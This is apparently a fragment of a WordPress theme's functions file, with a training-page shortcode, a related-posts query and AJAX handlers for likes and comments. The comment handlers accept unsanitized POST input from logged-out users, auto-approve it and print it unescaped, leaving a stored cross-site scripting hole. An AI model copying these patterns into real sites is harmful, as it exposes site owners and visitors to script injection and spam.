                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>';
             }
             $str .='</div></div><script><script>
function openCity(evt, cityName) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " active";
}
</script></script>';
       
      echo  $str;
}
add_shortcode( 'standalone_training', 'standalone_trainig_shortcode');


/*Standalone training page*/





function ums_get_related_posts( $post_id, $related_count, $args = array() ) {
    $terms = get_the_terms( $post_id, 'category' );
    
    if ( empty( $terms ) ) $terms = array();
    
    $term_list = wp_list_pluck( $terms, 'slug' );
    
    $related_args = array(
        'post_type' => 'post',
        'posts_per_page' => $related_count,
        'post_status' => 'publish',
        'post__not_in' => array( $post_id ),
        'orderby' => 'rand',
        'tax_query' => array(
            array(
                'taxonomy' => 'category',
                'field' => 'slug',
                'terms' => $term_list
            )
        )
    );

    return new WP_Query( $related_args );
}




function update_feed_like_count() {
        
      $post_id = intval( $_POST['post_id'] );
      $cuid = get_current_user_id();

        
      if( filter_var( $post_id, FILTER_VALIDATE_INT ) ) {
      
        $article = get_post( $post_id );
        $output_count = 0;
        
        if( !is_null( $article ) ) {
            $count = get_post_meta( $post_id, 'feed_likes', true );
            $feed_like_by = get_post_meta( $post_id, 'feed_like_by_'.$cuid, $cuid );
            if($feed_like_by){
                    $n = intval( $count );
                    $output_count = $n;
            }else{

                if( $count == '' ) {
                    update_post_meta( $post_id, 'feed_likes', '1' );
                     update_post_meta( $post_id, 'feed_like_by_'.$cuid, $cuid );
                    $output_count = 1;
                } else {
                    $n = intval( $count );
                    $n++;
                    update_post_meta( $post_id, 'feed_likes', $n );
                    update_post_meta( $post_id, 'feed_like_by_'.$cuid, $cuid );
                    $output_count = $n;
                }
            }
        }
        
      }
      $output = array( 'count' => $output_count );
      echo json_encode( $output );
      exit();
}

add_action( 'wp_ajax_update_feed_like', 'update_feed_like_count' );
add_action( 'wp_ajax_nopriv_update_feed_like', 'update_feed_like_count' );


function display_feed_likes( $post_id = null ) {
    $value = '';
    if( is_null( $post_id ) ) {
        global $post;
        $value = get_post_meta( $post->ID, 'feed_likes', true );
        
    } else {
        $value = get_post_meta( $post_id, 'feed_likes', true );  
    }
    
    echo $value;
}


function addFeedComment(){
    $current_user = wp_get_current_user();
     $post_id = intval( $_POST['post_id'] );
      $feedComment =  $_POST['feedComment'] ;

        $time = current_time('mysql');

        $data = array(
            'comment_post_ID' => $post_id,
            'comment_author' => $current_user->user_login,
            'comment_author_email' => $current_user->user_email,
            'comment_content' => $feedComment,
            'user_id' => $current_user->ID,
            'comment_date' => $time,
            'comment_approved' => 1,
            'comment_type' => 'custom-comment-class'
        );
        wp_insert_comment($data);

            $user_img = get_avatar_url( $current_user->ID,   array("size"=>50));
            if(empty($user_img)){
                $user_img = get_template_directory_uri()."/avatar.png";
            }


            $html = '<div class="part-1 d-flex align-items-center">';
            $html .= '<div class="image"><img src="'.$user_img.'">';
            $html .= '</div>';
            $html .= '<div class="post-content ml-3">';
            $html .= '<div class="username">'.$current_user->user_login.'</div>';
            $html .= ' <div class="time">'.$time.'</div>';
            $html .= '</div>';
            $html .= '</div>';
            $html .= '<div class="comment-box">';
            $html .= '<p>'.$feedComment.'</p></div>';


        $output = array( 'success' => "Feed has been added",'comment'=>$html );
      echo json_encode( $output );
      exit();
}

add_action( 'wp_ajax_add_feed_comment', 'addFeedComment' );
add_action( 'wp_ajax_nopriv_add_feed_comment', 'addFeedComment' );



function getFeedCommentByID(){
    $current_user = wp_get_current_user();
     $post_id = intval( $_POST['post_id'] );
      
     $html = '';
      $comments = get_comments(array(
                                    'post_id' => $post_id,
                                    'number' => '2' ));

      if(count($comments)){
        foreach($comments as $comment) {
            $user_img = get_avatar_url( $comment->user_id,   array("size"=>50));
            if(empty($user_img)){
                $user_img = get_template_directory_uri()."/avatar.png";
            }


            $html .= '<div class="part-1 d-flex align-items-center">';
            $html .= '<div class="image"><img src="'.$user_img.'">';
            $html .= '</div>';
            $html .= '<div class="post-content ml-3">';
            $html .= '<div class="username">'.$comment->comment_author.'</div>';
            $html .= ' <div class="time">'.$comment->comment_date.'</div>';
            $html .= '</div>';
            $html .= '</div>';
            $html .= '<div class="comment-box">';
            $html .= '<p>'.$comment->comment_content.'</p></div>';
        }
    }


        $output = array( 'success' => "CommentList",'comment'=>$html );
      echo json_encode( $output );
      exit();
}

add_action( 'wp_ajax_get_feed_comment', 'getFeedCommentByID' );
add_action( 'wp_ajax_nopriv_get_feed_comment', 'getFeedCommentByID' );

add_filter( 'avatar_defaults', 'wpb_new_gravatar' );
function wpb_new_gravatar ($avatar_defaults) {
    $myavatar = 'https://knowledge.communication.worldcares.org/wp-content/themes/astra/assets/images/opn_menu_logo.png';
    $avatar_defaults[$myavatar] = "Default Gravatar";
    return $avatar_defaults;
}


function modify_jquery() {
if (!is_admin()) {
    wp_deregister_script('jquery');
    wp_register_script('jquery', 'https://code.jquery.com/jquery-1.11.3.min.js');
    wp_enqueue_script('jquery');
}
}
add_action('init', 'modify_jquery');

?>



    